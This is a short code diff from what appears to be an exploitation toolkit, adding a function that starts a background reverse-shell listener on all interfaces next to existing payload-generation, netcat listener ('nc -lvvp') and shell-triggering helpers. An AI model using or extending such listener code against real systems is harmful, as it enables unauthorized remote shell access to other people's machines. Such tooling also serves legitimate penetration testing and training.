@@ -300,6 +300,13 @@ def generate_payload(type, local_address, port, index=None):
 def spawn_listener(port):
     pty.spawn(["nc", "-lvvp", str(port)])
 
+def spawn_background_shell(port):
+    listener = ShellListener("0.0.0.0", port)
+    listener.startBackground()
+    while listener.connection is None:
+        time.sleep(0.5)
+    return listener
+
 def trigger_shell(func, port):
     def _wait_and_exec():
         time.sleep(1.5)
